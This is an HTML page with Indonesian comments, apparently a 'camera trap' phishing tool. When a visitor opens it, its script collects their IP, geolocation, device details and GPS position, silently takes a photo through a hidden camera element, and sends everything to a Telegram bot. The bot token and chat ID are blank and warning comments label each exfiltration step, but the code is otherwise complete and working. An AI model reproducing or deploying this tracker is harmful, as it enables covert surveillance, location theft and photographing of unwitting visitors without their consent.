<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Camera</title>

  <style>
    body {
      background: black;
      color: lime;
      font-family: monospace;
      text-align: center;
      padding: 20px;
    }

    #info {
      white-space: pre-wrap;
      text-align: left;
      margin: auto;
      max-width: 600px;
      background: #111;
      padding: 20px;
      border-radius: 10px;
    }
  </style>
</head>

<body>

  <!-- Tampilan teks ke user -->
  <div id="info">Sabar Mankkk...</div>

  <!-- Elemen kamera (disembunyikan) -->
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    // ==============================
    // ⚠️ BAGIAN TERKAIT PIHAK LUAR
    // ==============================
    const botToken = ''; // ⚠️ TOKEN BOT TELEGRAM (DIKOSONGKAN)
    const chatId = '';   // ⚠️ ID TUJUAN CHAT TELEGRAM (DIKOSONGKAN)

    const infoDiv = document.getElementById('info');

    // ==============================
    // ⚠️ FUNGSI KIRIM DATA KE TELEGRAM
    // ==============================
    function sendToTelegram(text) {
      // ⚠️ Jika token diisi, data akan dikirim ke server Telegram
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        })
      })
      .then(r => r.json())
      .then(d => { if (!d.ok) console.error('❌ Telegram Error:', d); })
      .catch(e => console.error('❌ Telegram Fetch Error:', e));
    }

    // ==============================
    // ⚠️ FUNGSI KIRIM FOTO KE TELEGRAM
    // ==============================
    function sendPhotoToTelegram(blob) {
      // ⚠️ Mengupload hasil kamera ke Telegram
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob);

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(r => r.json())
      .then(d => { if (!d.ok) console.error('❌ Photo Upload Error:', d); })
      .catch(e => console.error('❌ Telegram Photo Error:', e));
    }

    // ==============================
    // ⚠️ PENGAMBILAN DATA DEVICE & IP
    // ==============================
    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';

      try {
        // ⚠️ Ambil IP dari layanan luar (ipify)
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;

        // ⚠️ Ambil lokasi berdasarkan IP (ip-api)
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();

        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch (err) {
        console.error('❌ IP/Location Error:', err);
      }

      // ⚠️ Ambil info baterai device
      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      // Data lengkap yang dikumpulkan
      const text = `
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${org}

Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}

Waktu      : ${new Date().toLocaleString()}
      `.trim();

      // Tampilkan ke layar
      infoDiv.innerText = text;

      // ⚠️ KIRIM DATA KE TELEGRAM (PIHAK LUAR)
      sendToTelegram(`<b>📥 Informasi Pengunjung:</b>\n<pre>${text}</pre>`);

      // ==============================
      // ⚠️ AKSES LOKASI GPS
      // ==============================
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            // ⚠️ Kirim lokasi GPS ke Telegram
            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          err => sendToTelegram(`📍 Lokasi GPS Ditolak`)
        );
      } else {
        sendToTelegram(`📍 Browser tidak support GPS`);
      }
    }

    // ==============================
    // ⚠️ AKSES KAMERA DEVICE
    // ==============================
    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');

      try {
        // ⚠️ Minta akses kamera user
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(() => {
            // Ambil gambar dari kamera
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
              // ⚠️ KIRIM FOTO KE TELEGRAM
              if (blob) sendPhotoToTelegram(blob);

              // Matikan kamera setelah ambil gambar
              stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg');
          }, 3000);
        };

      } catch (e) {
        console.warn('❌ Kamera gagal:', e);
        sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
      }
    }

    // ==============================
    // JALANKAN SEMUA
    // ==============================
    getInfo();
    startCamera();

  </script>
</body>
</html>
